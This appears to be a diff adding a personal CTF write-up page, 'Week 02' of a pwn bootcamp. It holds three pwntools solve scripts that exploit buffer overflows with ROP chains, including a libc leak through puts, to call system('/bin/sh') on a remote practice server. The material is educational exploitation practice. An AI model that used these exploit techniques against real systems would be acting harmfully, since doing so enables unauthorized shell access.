@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>anomie0xff</title>
+    <link rel="stylesheet" href="https://anomie0xff.github.io/style.css">
+</head>
+
+<body>
+    <div class="header">
+        <h3><ul>
+            <li><a href="/">/anomie0xff</a></li>
+            <li><a href="/writeups">/writeups</a></li>
+            <li><a href="/pwn_bootcamp">/pwn_bootcamp</a></li>
+            <li><a href="/pwn_college">/pwn.college</a></li>
+        </ul></h3>
+    </div>
+    <section class="section">
+        <div class="container">
+            
+<h1 class="title">
+  Week 02
+</h1>
+
+<div class="page-content">
+<h1 id="args">args</h1>
+<p>ROPchain to modify registers and call function</p>
+<p>Solve script:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>p = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">128.199.12.141</span><span>&quot;, </span><span style="color:#d08770;">7010</span><span>)
+</span><span>
+</span><span>buf = </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*</span><span style="color:#d08770;">40
+</span><span>
+</span><span>win = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x401142</span><span>)
+</span><span>
+</span><span>rdi_ret = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x40121b</span><span>)
+</span><span>
+</span><span>rsi_r15_ret = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x401219</span><span>)
+</span><span>
+</span><span>payload = buf + rdi_ret + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0xAAAA</span><span>) + rsi_r15_ret + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0xBBBB</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0xBBBB</span><span>) + win
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">interactive</span><span>()
+</span></code></pre>
+<h1 id="leaked">leaked</h1>
+<p>Use leaked system address to call system(&quot;/bin/sh&quot;)</p>
+<p>Solve script:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>p = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">128.199.12.141</span><span>&quot;, </span><span style="color:#d08770;">7001</span><span>)
+</span><span>
+</span><span>leak = p.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">,</span><span>&#39;)
+</span><span>system = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">int</span><span>(leak[-</span><span style="color:#d08770;">15</span><span>:-</span><span style="color:#d08770;">1</span><span>].</span><span style="color:#bf616a;">decode</span><span>(), </span><span style="color:#d08770;">16</span><span>))
+</span><span>
+</span><span>buf = </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*</span><span style="color:#d08770;">40
+</span><span>
+</span><span>bin_sh = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x402008</span><span>)
+</span><span>
+</span><span>rdi_ret = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x40122b</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(buf + rdi_ret + bin_sh + system)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">interactive</span><span>()
+</span></code></pre>
+<h1 id="leakme">leakme</h1>
+<p>Leak libc using puts and call system(&quot;/bin/sh&quot;)</p>
+<p>Solve script:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>p = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">128.199.12.141</span><span>&quot;, </span><span style="color:#d08770;">7002</span><span>)
+</span><span>
+</span><span>exe = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./leakme</span><span>&quot;)
+</span><span>libc = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&quot;)
+</span><span>ld = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./ld-linux-x86-64.so.2</span><span>&quot;)
+</span><span>
+</span><span>puts_plt = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x401030</span><span>)
+</span><span>puts_got = </span><span style="color:#bf616a;">p64</span><span>(exe.got[&#39;</span><span style="color:#a3be8c;">puts</span><span>&#39;])
+</span><span>
+</span><span>bin_sh = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x402008</span><span>)
+</span><span>
+</span><span>rdi_ret = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x4011fb</span><span>)
+</span><span>
+</span><span>vuln = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x401142</span><span>)
+</span><span>
+</span><span>buf = </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*</span><span style="color:#d08770;">40
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">recv</span><span>()
+</span><span>
+</span><span>payload = buf + rdi_ret + puts_got + puts_plt + vuln
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span><span>
+</span><span>leak = p.</span><span style="color:#bf616a;">recvline</span><span>()
+</span><span>
+</span><span>base = </span><span style="color:#bf616a;">u64</span><span>(leak.</span><span style="color:#bf616a;">rstrip</span><span>().</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">8</span><span>, </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#96b5b4;">\x00</span><span>&#39;)) - libc.symbols[&#39;</span><span style="color:#a3be8c;">puts</span><span>&#39;]
+</span><span>
+</span><span>system = </span><span style="color:#bf616a;">p64</span><span>(base + libc.symbols[&#39;</span><span style="color:#a3be8c;">system</span><span>&#39;])
+</span><span>
+</span><span>payload2 = buf + rdi_ret + bin_sh + system
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(payload2)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">interactive</span><span>()
+</span></code></pre>
+
+</div>
+
+        </div>
+    </section>
+</body>
+
+</html>
